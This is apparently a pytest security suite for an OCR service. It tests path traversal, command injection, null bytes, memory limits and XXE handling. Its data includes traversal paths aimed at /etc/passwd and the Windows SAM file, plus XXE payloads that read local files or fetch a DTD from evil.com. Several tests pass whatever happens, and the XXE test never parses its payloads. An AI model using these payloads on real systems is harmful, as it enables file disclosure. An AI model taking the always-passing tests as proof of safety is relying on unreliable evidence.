"""
OCR Security Testing Suite

Tests for input validation, security vulnerabilities, and safe handling
of malicious or malformed inputs.
"""

import os
import tempfile

import pytest

from ocr_mcp.core.error_handler import ErrorHandler


class TestInputValidation:
    """Test input validation and security measures."""

    def test_path_traversal_prevention(self, security_test_cases):
        """Test that path traversal attacks are prevented."""
        for malicious_path in security_test_cases["path_traversal"]:
            with pytest.raises(Exception):  # Should raise validation error
                ErrorHandler.validate_file_path(malicious_path)

    def test_file_size_limits(self, security_test_cases, file_manager):
        """Test file size validation and limits."""
        # Test large file handling
        for large_file_spec in security_test_cases["large_files"]:
            size = large_file_spec["size"]

            # Create a mock large file (without actually allocating memory)
            large_file_path = file_manager.base_dir / f"large_file_{size}.bin"

            # Write just enough to trigger size checks
            chunk_size = 1024 * 1024  # 1MB chunks
            written = 0

            with open(large_file_path, "wb") as f:
                while written < min(size, 100 * 1024 * 1024):  # Cap at 100MB for testing
                    chunk = b"0" * chunk_size
                    f.write(chunk)
                    written += chunk_size

            # Test that file operations handle large files gracefully
            if size > 50 * 1024 * 1024:  # 50MB limit
                # Should either reject or handle gracefully
                try:
                    # Attempt some operation that might be size-sensitive
                    with open(large_file_path, "rb") as f:
                        f.read(1024)  # Just read a small chunk
                    # If we get here, file operations should still work
                    assert True
                except OSError:
                    # Acceptable to fail on very large files
                    assert True

    def test_malformed_file_handling(self, security_test_cases, file_manager):
        """Test handling of malformed or corrupted files."""
        for malformed_content in security_test_cases["malformed_files"]:
            # Create malformed file
            malformed_path = file_manager.create_temp_file(malformed_content, ".bin")

            # Test that operations fail gracefully
            try:
                # Try to validate as image
                from PIL import Image

                Image.open(malformed_path).verify()
                # If we get here, the file was somehow valid (unexpected)
                pytest.fail(f"Malformed content was accepted: {malformed_content[:50]}...")
            except Exception:
                # Expected to fail - malformed files should be rejected
                assert True

    def test_special_character_handling(self, security_test_cases, file_manager):
        """Test handling of files with special characters in names."""
        for special_name in security_test_cases["special_characters"]:
            # Create file with special name
            special_path = file_manager.base_dir / special_name
            special_path.write_text("test content")

            # Test that operations work with special characters
            assert special_path.exists()
            assert special_path.read_text() == "test content"

            # Test path validation
            validation_result = ErrorHandler.validate_file_path(str(special_path))
            if special_name not in ["file_with_特殊字符.jpg"]:  # Some Unicode might fail
                assert validation_result is None  # Should pass validation

    def test_command_injection_prevention(self, security_test_cases):
        """Test that command injection is prevented."""
        # This would test any shell command execution
        # For now, test that dangerous strings are properly escaped

        for injection_attempt in security_test_cases["command_injection"]:
            # Test that these strings don't cause issues when used in file operations
            safe_name = injection_attempt.replace("/", "_").replace("\\", "_").replace(";", "_")

            # Create a file with the injection attempt as content
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                f.write(f"Content: {injection_attempt}")
                temp_path = f.name

            try:
                # Read back and verify content is preserved
                with open(temp_path) as f:
                    content = f.read()
                assert injection_attempt in content
            finally:
                os.unlink(temp_path)

    def test_null_byte_handling(self):
        """Test handling of null bytes in input."""
        null_byte_strings = [
            "normal_string\x00malicious",
            "\x00start_with_null",
            "end_with_null\x00",
            "multiple\x00null\x00bytes",
        ]

        for null_string in null_byte_strings:
            # Test that file operations handle null bytes
            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                try:
                    f.write(null_string)
                    temp_path = f.name
                except UnicodeEncodeError:
                    # Expected - null bytes in text mode
                    continue

            try:
                with open(temp_path, "rb") as f:
                    content = f.read()
                # Should be able to read back the bytes
                assert len(content) > 0
            finally:
                os.unlink(temp_path)

    def test_directory_traversal_prevention(self):
        """Test prevention of directory traversal in file paths."""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\sam",
            "../../../../root/.bashrc",
            "....//....//....//etc/passwd",
        ]

        for traversal_path in traversal_attempts:
            # Should fail validation
            result = ErrorHandler.validate_file_path(traversal_path)
            assert result is not None, f"Path traversal not prevented: {traversal_path}"
            assert "FILE_NOT_FOUND" in str(result)

    def test_file_type_validation(self, test_data_generator, file_manager):
        """Test that file type validation works correctly."""
        # Create various file types
        test_files = [
            ("png", test_data_generator.create_test_image(format="PNG")),
            ("jpg", test_data_generator.create_test_image(format="JPEG")),
            ("pdf", test_data_generator.create_test_pdf(file_manager.base_dir / "test.pdf")),
        ]

        for expected_type, file_obj in test_files:
            if hasattr(file_obj, "format"):  # PIL Image
                # Images should be valid
                assert file_obj.size[0] > 0
                assert file_obj.size[1] > 0
            else:  # File path
                assert file_obj.exists()

    def test_memory_exhaustion_prevention(self):
        """Test prevention of memory exhaustion attacks."""
        # Test with extremely large strings
        large_strings = [
            "A" * (10 * 1024 * 1024),  # 10MB string
            "B" * (50 * 1024 * 1024),  # 50MB string
        ]

        for large_string in large_strings:
            # Test that string operations don't cause memory issues
            try:
                # Basic string operations
                length = len(large_string)
                assert length == len(large_string)

                # Substring operations
                substring = large_string[:100]
                assert len(substring) == 100

            except MemoryError:
                # If we get MemoryError, that's acceptable for extreme cases
                assert True
            except Exception:
                # Other exceptions might be acceptable
                assert True

    def test_encoding_attacks(self, security_test_cases):
        """Test handling of various text encodings and potential attacks."""
        for encoding in security_test_cases["encodings"]:
            test_string = "Test string with encoding: " + encoding

            try:
                # Test encoding/decoding
                encoded = test_string.encode(encoding)
                decoded = encoded.decode(encoding)
                assert decoded == test_string
            except (UnicodeEncodeError, UnicodeDecodeError, LookupError):
                # Some encodings might not be supported - that's OK
                assert True

    def test_xml_external_entity_prevention(self):
        """Test prevention of XML external entity attacks."""
        # Test XML content that might try XXE
        xxe_attempts = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/malicious.dtd"><data>content</data>',
        ]

        for xxe_content in xxe_attempts:
            # Test that our XML utilities handle this safely
            try:
                from backend.app import dict_to_xml

                # This should not execute external entities
                result = dict_to_xml({"test": "data"})
                assert "test" in result
                assert "data" in result
            except Exception:
                # XML parsing errors are acceptable
                assert True

    def test_buffer_overflow_prevention(self):
        """Test prevention of buffer overflow conditions."""
        # Test with extremely long inputs
        long_inputs = [
            "A" * (1024 * 1024),  # 1MB string
            ["item"] * (100 * 1024),  # 100K element list
            {"key" + str(i): "value" + str(i) for i in range(10 * 1024)},  # 10K key dict
        ]

        for long_input in long_inputs:
            try:
                if isinstance(long_input, str):
                    # String operations
                    assert len(long_input) > 1000
                    substring = long_input[:100]
                    assert len(substring) == 100
                elif isinstance(long_input, list):
                    # List operations
                    assert len(long_input) > 1000
                    first_items = long_input[:10]
                    assert len(first_items) == 10
                elif isinstance(long_input, dict):
                    # Dict operations
                    assert len(long_input) > 1000
                    keys = list(long_input.keys())[:5]
                    assert len(keys) == 5
            except MemoryError:
                # Memory exhaustion is acceptable for extreme cases
                assert True

    @pytest.mark.parametrize("input_type", ["string", "bytes", "file"])
    def test_input_sanitization(self, input_type, security_test_cases):
        """Test that all input types are properly sanitized."""
        test_inputs = {
            "string": security_test_cases["special_strings"],
            "bytes": [
                s.encode("utf-8", errors="ignore") for s in security_test_cases["special_strings"]
            ],
            "file": [],  # Would create temporary files with special content
        }

        for test_input in test_inputs[input_type]:
            # Test that input doesn't cause crashes
            try:
                if input_type == "string":
                    # String operations
                    processed = str(test_input).strip()
                    assert isinstance(processed, str)
                elif input_type == "bytes":
                    # Bytes operations
                    processed = bytes(test_input)
                    assert isinstance(processed, bytes)
                elif input_type == "file":
                    # File operations would be tested here
                    pass
            except Exception:
                # Some inputs may legitimately cause errors - that's OK
                assert True
